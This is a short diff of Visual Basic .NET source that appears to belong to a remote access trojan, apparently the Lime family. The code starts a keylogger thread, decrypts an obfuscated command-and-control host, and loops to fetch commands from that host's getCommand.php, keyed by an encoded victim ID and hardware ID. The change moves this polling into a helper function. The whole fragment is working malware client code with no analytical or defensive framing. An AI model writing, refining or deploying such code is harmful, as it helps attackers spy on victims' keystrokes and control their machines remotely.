@@ -220,12 +220,11 @@ Public Class Form1
     End Function
     Public Sub IND(ByVal x As Boolean)
         Try
-            Do While x = True
                 Dim CurrentHost As String
-                Dim GetCommands As New WebClient
                 Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
                 If RSAStatus = "True" Then : CurrentHost = RSA_Decrypt(Host, RSAKey) : Else : CurrentHost = Host : End If
-                Dim Command As String = GetCommands.DownloadString(CurrentHost & "/getCommand.php?id=" & C.ENB(ID & "_" & HWD()))
+            Do While x = True
+                Dim Command As String = C._GET("getCommand.php?id=" & C.ENB(ID & "_" & HWD()))
                 Dim A As String() = Split(C.DEB(Command), Y)
                 Select Case A(0)
                     Case "Ping"
